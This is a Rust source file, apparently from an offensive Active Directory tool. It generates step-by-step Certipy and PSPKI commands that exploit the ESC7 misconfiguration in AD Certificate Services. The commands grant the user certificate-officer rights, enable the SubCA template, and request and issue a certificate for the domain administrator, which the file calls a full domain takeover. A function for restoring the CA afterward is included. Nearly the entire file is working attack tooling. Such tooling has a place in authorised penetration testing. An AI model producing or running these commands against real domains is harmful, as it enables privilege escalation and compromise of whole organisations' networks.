//! ESC7 (Vulnerable Certificate Authority Access Control) execution
//!
//! Exposes functions to generate commands to manipulate CA permissions when
//! an attacker has ManageCA rights. The attack grants the attacker
//! ManageCertificates rights, enables the SubCA template, and requests a
//! certificate to perform a full domain takeover.

use crate::error::Result;
use tracing::info;

/// Target for ESC7 CA modification
pub struct Esc7Target {
    pub ca_name: String,
    pub ca_server: String,
    pub domain: String,
    pub current_user: String,
}

impl Esc7Target {
    pub fn new(
        ca_name: impl Into<String>,
        ca_server: impl Into<String>,
        domain: impl Into<String>,
        current_user: impl Into<String>,
    ) -> Self {
        Self {
            ca_name: ca_name.into(),
            ca_server: ca_server.into(),
            domain: domain.into(),
            current_user: current_user.into(),
        }
    }

    /// Generate the required PowerView or Certipy commands to abuse the ESC7 vulnerability
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!("Generating ESC7 exploit commands for CA: {}", self.ca_name);

        let certipy_command_1 = format!(
            "certipy ca -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -add-officer '{}'",
            self.current_user, self.domain, self.ca_name, self.current_user
        );

        let certipy_command_2 = format!(
            "certipy ca -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -enable-template SubCA",
            self.current_user, self.domain, self.ca_name
        );

        let certipy_command_3 = format!(
            "certipy req -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -target '{}' -template SubCA -upn administrator@{}",
            self.current_user, self.domain, self.ca_name, self.ca_server, self.domain
        );

        let certipy_command_4 = format!(
            "certipy ca -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -issue-request <REQUEST_ID>",
            self.current_user, self.domain, self.ca_name
        );

        let certipy_command_5 = format!(
            "certipy req -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -target '{}' -retrieve <REQUEST_ID>",
            self.current_user, self.domain, self.ca_name, self.ca_server
        );

        let pspki_command = format!(
            "Import-Module PSPKI\n\
            $ca = Get-CertificationAuthority -Name '{}'\n\
            Add-CAAccessRight -CertificationAuthority $ca -Principal '{}' -AccessType Allow -AccessRight ManageCertificates",
            self.ca_name, self.current_user
        );

        let instructions = format!(
            "=== ESC7 Exploit Generation ===\n\
             The CA '{}' is vulnerable to ESC7 (You have ManageCA rights).\n\
             Overthrone currently implements ESC7 via command generation.\n\n\
             [Certipy (Recommended)]\n\
             1. Grant yourself ManageCertificates:\n\
                {}\n\
             2. Enable the SubCA template:\n\
                {}\n\
             3. Request an administrator certificate (It will fail with status UNDER_SUBMISSION):\n\
                {}\n\
             4. Issue the pending certificate (you will need the Request ID from step 3):\n\
                {}\n\
             5. Retrieve the issued certificate:\n\
                {}\n\n\
             [PSPKI (PowerShell)]\n\
             {}\n",
            self.ca_name,
            certipy_command_1,
            certipy_command_2,
            certipy_command_3,
            certipy_command_4,
            certipy_command_5,
            pspki_command
        );

        Ok(instructions)
    }

    /// Restore the CA permissions/configuration to its original state
    pub fn generate_restore_commands(&self) -> Result<String> {
        let certipy_restore_1 = format!(
            "certipy ca -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -remove-officer '{}'",
            self.current_user, self.domain, self.ca_name, self.current_user
        );

        let certipy_restore_2 = format!(
            "certipy ca -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -disable-template SubCA",
            self.current_user, self.domain, self.ca_name
        );

        let instructions = format!(
            "=== ESC7 Restore Generation ===\n\
             To restore the CA '{}' to its original state:\n\n\
             1. Remove your officer rights:\n\
                {}\n\
             2. Disable the SubCA template (if you enabled it):\n\
                {}\n",
            self.ca_name, certipy_restore_1, certipy_restore_2
        );

        Ok(instructions)
    }
}
